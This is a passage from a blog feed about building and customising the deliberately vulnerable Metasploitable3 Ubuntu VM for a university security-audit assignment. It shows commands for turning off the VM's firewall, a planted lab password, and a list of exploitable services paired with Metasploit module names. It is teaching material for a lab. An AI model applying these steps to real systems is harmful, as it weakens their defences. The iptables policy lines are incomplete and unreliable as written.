&lt;p&gt;If you did not remove the &lt;code class=&quot;language-text&quot;&gt;iptables.rb&lt;/code&gt; &lt;em&gt;recipe&lt;/em&gt; you can always manually turn off the firewall on a live system. This is easily achieved using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo iptables --policy INPUT
sudo iptables --policy OUTPUT
sudo iptables --policy FORWARD
sudo iptables -F&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;changing-the-flags&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#changing-the-flags&quot; aria-label=&quot;changing the flags permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Changing the flags&lt;/h4&gt;
&lt;p&gt;One of the most exciting aspects of Metasploitable3 are the flags. Nested in the capture the flag tournaments, flags offer the chance to find and extract information. They add something fun into the mix. In an assessment, the flags are thoroughly enjoyed by students. Instead of writing a Chef &lt;em&gt;recipe&lt;/em&gt; to build custom flags, I simply disable the &lt;em&gt;recipe&lt;/em&gt; and manually add them. In my assessment, the flags are much easier. For example, in the home directory of &lt;code class=&quot;language-text&quot;&gt;boba_fett&lt;/code&gt; I added a text file to help students find a user account with &lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt; access, and provide them a password at the same time.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Darth Vader always forgets his password, so I was told to keep a backup.

Documented the password for darth_vader below:
daddy_issues2277

I mean, for someone so powerful with the force, he is kinda forgetful.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Hopefully, this tutorial gave you some guidance and hints about customizing Metasploitable3 Ubuntu Linux version. These changes can be exceptionally useful if you want to have a custom virtual machine that targets different levels of difficulty or uses different user credentials. Stay tuned for my next Metasploitable3 tutorial, a summary of some vulnerabilities and exploits for the Metasploitable3 Ubuntu Linux version.&lt;/p&gt;
&lt;p&gt;If you are interested in the steps/method I used to configure Metasploitable3 Windows Server 2008 version, please leave a comment. I have the notes for 2017, and would happy re-visit and re-build the machine while making notes if anyone is interested! Also, if you have any feedback, ideas or questions, please leave a comment below.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Metasploitable3 - Building the Ubuntu Linux Version]]></title><description><![CDATA[This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series: Part 1: Building…]]></description><link>https://thomaslaurenson.com/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/</guid><pubDate>Tue, 03 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href=&quot;/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/&quot;&gt;Building the Ubuntu Linux Version&lt;/a&gt; (You are here!)&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href=&quot;/blog/2018-07-04-metasploitable3-customizing-the-ubuntu-linux-version&quot;&gt;Customizing the Ubuntu Linux Version&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href=&quot;/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1&quot;&gt;Pentesting the Ubuntu Linux Version - SQL Injection&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href=&quot;/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2&quot;&gt;Pentesting the Ubuntu Linux Version - Attacking Services&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#metasploitable2-metasploitable3-and-infosec-assignments&quot;&gt;Metasploitable2, Metasploitable3 and InfoSec Assignments&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#building-the-metasploitable3-linux-version&quot;&gt;Building the Metasploitable3 Linux Version&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#install-application-requirements-dependencies&quot;&gt;Install Application Requirements (Dependencies)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#building-metasploitable3-linux-version&quot;&gt;Building Metasploitable3 Linux Version&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Metasploitable3 is an intentionally vulnerable machine build for exploit testing (aka. pen testing). Back in November, 2016, &lt;a href=&quot;https://blog.rapid7.com/2016/11/15/test-your-might-with-the-shiny-new-metasploitable3/&quot;&gt;Rapid7&lt;/a&gt; released Metasploitable3. I had used the previous version, &lt;a href=&quot;https://metasploit.help.rapid7.com/docs/metasploitable-2&quot;&gt;Metasploitable2&lt;/a&gt;, to learn the basics of penetration testing. It was an excellent platform for exploratory testing, and I was sure Metasploitable3 was going to be the same experience… it was!&lt;/p&gt;
&lt;h2 id=&quot;metasploitable2-metasploitable3-and-infosec-assignments&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#metasploitable2-metasploitable3-and-infosec-assignments&quot; aria-label=&quot;metasploitable2 metasploitable3 and infosec assignments permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Metasploitable2, Metasploitable3 and InfoSec Assignments&lt;/h2&gt;
&lt;p&gt;In my first semester of teaching Introduction to Information Security in Semester 1, 2017, I used Metasploitable2 for in-class practical lab exercises. I did the same again this year. For the first assignment in the paper, students have to perform an information security audit and document all findings in a security audit report. It is a fun assignment! Last year, I choose Metasploitable3 in the hopes that they wouldn’t find out what system they were auditing. I went to great lengths to ensure there was no trace of the phrase &lt;em&gt;Metasploitable3&lt;/em&gt; in the system. I am pretty sure it went un-noticed! This year I was looking for something new, and I accidentally stumbled across Metasploitable3… the Linux version! It’s an exciting story, but in summary, I was building the Windows Server 2008 version on Linux and noticed the BASH script was expecting an argument…&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;case &quot;$1&quot; in
    ubuntu1404)  echo &quot;building ubuntu 1404&quot;
                 os_full=&quot;ubuntu_1404&quot;
                 os_short=&quot;ub1404&quot;
                 ;;
    windows2008) echo &quot;building windows 2008&quot;
                 os_full=&quot;windows_2008_r2&quot;
                 os_short=&quot;win2k8&quot;
                 ;;
esac&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A sense of great interest filled my heart. I had just re-read the &lt;a href=&quot;https://github.com/rapid7/metasploitable3/wiki&quot;&gt;Metasploitable3 Wiki&lt;/a&gt;, perused over the &lt;a href=&quot;https://github.com/rapid7/metasploitable3&quot;&gt;source code on the GitHub repository&lt;/a&gt; and had seen nothing about a Linux version. I checked the first &lt;a href=&quot;https://blog.rapid7.com/2016/11/15/test-your-might-with-the-shiny-new-metasploitable3/&quot;&gt;Rapid7 blog post&lt;/a&gt; about Metasploitable3 and noticed the following statement:&lt;/p&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Although our first image is Windows, the planning part of the Linux version has already begun. If you would like to jump on this train, please feel free to leave a comment on Github, or contribute.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;A bit of further digging revealed a &lt;a href=&quot;https://github.com/rapid7/metasploitable3/issues/37&quot;&gt;GitHub issue&lt;/a&gt; was opened by a user named prateepb who stated that they’d be happy to create a Linux version. There was a bit of chatter back and forth, and even a post summarising a selection of tasty vulnerabilities for the system:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;SSH with weak passwords
PHPMyAdmin [I&apos;m currently working on this one locally]
WebDAV (with PUT method enabled)
ProFTPD 1.3.5 (proftpd_modcopy_exec)
Apache Continuum 1.4.2 (apache_continuum_cmd_exec) &gt; rapid7/metasploit-framework#6962
VNC (vnc_keyboard_exec)
Cacti 0.8.8 (cacti_tree_sqli)
Samba (samba_symlink_traversal)
Apache with mod_cgi (apache_mod_cgi_bash_env_exec)
Cups 1.7.2 (cups_bash_env_exec)
JBoss AS 6.1.0.Final (JDK 6, 7)
ActionPack 4.2.4 (rails_actionpack_inline_exec)
Custom PHP login page that&apos;s vulnerable to SQL injection
Splunk 6.1.1 (splunk_upload_app_exec)
MySQL binding 0.0.0.0
UnreaIRCD IRC daemon (unreal_ircd_3281_backdoor)
Drupal 7.5 (drupal_restws_exec)
Linux kernel &gt;=4.4 bpf_priv_esc
Docker (docker_daemon_privilege_escalation)
Linux Local CVE-2016-4997&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Very recently, in February 2018, the user &lt;a href=&quot;https://github.com/rapid7/metasploitable3/pull/231&quot;&gt;jbarnett-r7 submitted a push request on GitHub&lt;/a&gt; to include the code for the Linux box that was used for the &lt;a href=&quot;https://blog.rapid7.com/2017/12/11/congrats-to-the-winners-of-our-2017-community-ctf/&quot;&gt;capture the flag competition hosted by Rapid7&lt;/a&gt; in December 2017. This addition was after I built the Metasploitable3 Linux version for my assignment.&lt;/p&gt;
&lt;p&gt;Even with the odds against me, I decided to use the Metapsploitable3 Linux version for my assignment. It was new and interesting, and I needed a challenge. Also, I luckily started planning the classes in advance so had the time to tinker and test!&lt;/p&gt;
&lt;h2 id=&quot;building-the-metasploitable3-linux-version&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#building-the-metasploitable3-linux-version&quot; aria-label=&quot;building the metasploitable3 linux version permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building the Metasploitable3 Linux Version&lt;/h2&gt;
&lt;p&gt;The problem I initially faced was that there was no formal documentation about the Metasploitable3 Linux version. There was no information on building the Linux version, and no (robust) information about the vulnerabilities in the system. I am guessing that is because the build was (and seems to still be) in active development. This was in stark contrast to the Metasplotable3 Windows Server 2008 version, which is heavily documented on the &lt;a href=&quot;https://github.com/rapid7/metasploitable3/wiki&quot;&gt;Rapid7 GitHub Wiki&lt;/a&gt;. There are configuration instructions, tips and tricks and, most importantly, a list of vulnerabilities.&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;https://github.com/rapid7/metasploitable3/blob/master/README.md&quot;&gt;README.md&lt;/a&gt; file from the Metasploitable3 repository has the most up-to-date information on building the system. They specify the following system requirements:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OS capable of running all of the required applications listed below&lt;/li&gt;
&lt;li&gt;VT-x/AMD-V Supported Processor recommended&lt;/li&gt;
&lt;li&gt;65 GB Available space on the drive&lt;/li&gt;
&lt;li&gt;4.5 GB RAM&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In terms of the selected build operating system, the only requirement is that the system can run the applications listed in the next section. Technically, this could be achievable on Microsoft Windows, but building on Linux is much more sensible. This tutorial uses Ubuntu Desktop 18.04 amd64 LTS as the operating system. &lt;/p&gt;
&lt;p&gt;As usual, make sure your system is up-to-date by running the &lt;code class=&quot;language-text&quot;&gt;update&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;upgrade&lt;/code&gt; commands:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt update &amp;&amp; sudo apt upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now it is time to install the application/tool dependencies.&lt;/p&gt;
&lt;h3 id=&quot;install-application-requirements-dependencies&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#install-application-requirements-dependencies&quot; aria-label=&quot;install application requirements dependencies permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Install Application Requirements (Dependencies)&lt;/h3&gt;
&lt;p&gt;In addition to the system requirements specified above, the README file also specifies the following collection of package requirements:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Packer&lt;/li&gt;
&lt;li&gt;Vagrant&lt;/li&gt;
&lt;li&gt;Vagrant Reload Plugin&lt;/li&gt;
&lt;li&gt;VirtualBox&lt;/li&gt;
&lt;li&gt;Internet connection&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When I started trying to build Metasploitable3, I ran into dependency issues. Specifically, I had problems with the versions of the tools I had installed. On a closer inspection of the &lt;a href=&quot;https://github.com/rapid7/metasploitable3/blob/master/build.sh&quot;&gt;build.sh&lt;/a&gt; script, I noticed there were a collection of variables that checked the tool requirement version numbers. A snippet of the code is displayed below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;min_vbox_ver=&quot;5.1.10&quot;
min_vagrant_ver=&quot;1.9.0&quot;
min_packer_ver=&quot;0.10.0&quot;
min_vagrantreload_ver=&quot;0.0.1&quot;
packer_bin=&quot;packer&quot;
packer_build_path=&quot;packer/builds&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The above tools were all marked as &lt;em&gt;minimum&lt;/em&gt;, guessing that these were the minimum versions required to build Metasploitable3. The following instructions specify how I set up my build environment to match the above requirements.&lt;/p&gt;
&lt;h4 id=&quot;installing-oracle-virtual-box&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#installing-oracle-virtual-box&quot; aria-label=&quot;installing oracle virtual box permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing Oracle Virtual Box&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://www.virtualbox.org/&quot;&gt;VirtualBox&lt;/a&gt; is an open source (GPLv2) x86/x64 virtualization product that runs on Windows, Linux, OS X, and Solaris systems. In this tutorial, it is used to host the virtualized guest operating system (Metasploitable3) while it is being built. &lt;/p&gt;
&lt;p&gt;In Ubuntu 18.04, VirtualBox is provided in the default &lt;code class=&quot;language-text&quot;&gt;apt&lt;/code&gt; repositories. This is a decent option to install as the application will be tested with Ubuntu and updates provided when a new stable version is added to the package repository. But you could install from the Debian package provided on the &lt;a href=&quot;https://www.virtualbox.org/wiki/Linux_Downloads&quot;&gt;Download VirtualBox for Linux Hosts&lt;/a&gt; page. This tutorial uses the package repository, which (at time of writing) provides version 5.2.10. You can search the package repository using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:~$ apt search virtualbox
...
virtualbox/bionic-updates,now 5.2.10-dfsg-6ubuntu18.04.1 amd64
  x86 virtualization solution - base binaries
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As specified in the Metasploitable3 README, VirtualBox version 5.1.10 or higher is required. You can install VirtualBox using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:~$ sudo apt install virtualbox&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once VirtualBox has been installed, check the version by running the &lt;code class=&quot;language-text&quot;&gt;virtualbox&lt;/code&gt; command and the &lt;code class=&quot;language-text&quot;&gt;--help&lt;/code&gt; option to confirm what version you are running:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:~$ virtualbox --help
Oracle VM VirtualBox Manager 5.2.10_Ubuntu&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;One last step for VirtualBox. The Metasploitable3 project requires the VirtualBox Guest Additions. Again, this can easily be installed from the Ubuntu repositories using the &lt;code class=&quot;language-text&quot;&gt;apt&lt;/code&gt; command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:~$ sudo apt install virtualbox-guest-additions-iso&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;installing-vagrant&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#installing-vagrant&quot; aria-label=&quot;installing vagrant permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing Vagrant&lt;/h4&gt;
&lt;p&gt;The second requirement for building Metasploitable3 is the vagrant tool. Developed by HashiCorp, &lt;a href=&quot;https://www.vagrantup.com/&quot;&gt;Vagrant&lt;/a&gt; is a tool for building and managing virtual machine environments which automates system configuration. We are going to use the Debian package provided by HashiCorp. &lt;/p&gt;
&lt;p&gt;We will start by moving into the &lt;code class=&quot;language-text&quot;&gt;/tmp&lt;/code&gt; directory, a good place for temporary files:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:~$ cd /tmp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, download the Debian package. This tutorial uses Vagrant version 2.1.2. It would be worth checking if there is an updated Debian 64-bit package when you are building. Check the &lt;a href=&quot;https://www.vagrantup.com/downloads.html&quot;&gt;Download Vagrant website&lt;/a&gt; and use an updated URL if an update is available. Download Vagrant using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:/tmp$ wget https://releases.hashicorp.com/vagrant/2.1.2/vagrant_2.1.2_x86_64.deb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Install the Debian package using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:/tmp$ sudo dpkg -i vagrant_2.1.2_x86_64.deb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure you check the install:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:/tmp$ vagrant version
Installed Version: 2.1.2
Latest Version: 2.1.2

You&apos;re running an up-to-date version of Vagrant!&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;installing-packer&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#installing-packer&quot; aria-label=&quot;installing packer permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing Packer&lt;/h4&gt;
&lt;p&gt;The third requirement for building Metasploitable3 is the &lt;a href=&quot;https://www.packer.io/&quot;&gt;packer&lt;/a&gt; tool. Again, this tool is produced by HashiCorp and is used to automates the creation of any type of machine image.&lt;/p&gt;
&lt;p&gt;There is only a binary available for packer, distributed in a zip archive. Now, download the Debian package. This tutorial uses Packer version 1.2.4. It would be worth checking if there is an updated version when you are building. Check the &lt;a href=&quot;https://www.packer.io/downloads.html&quot;&gt;Download Packer website&lt;/a&gt; and use an updated URL if an update is available. Download Packer using the following command:&lt;/p&gt;
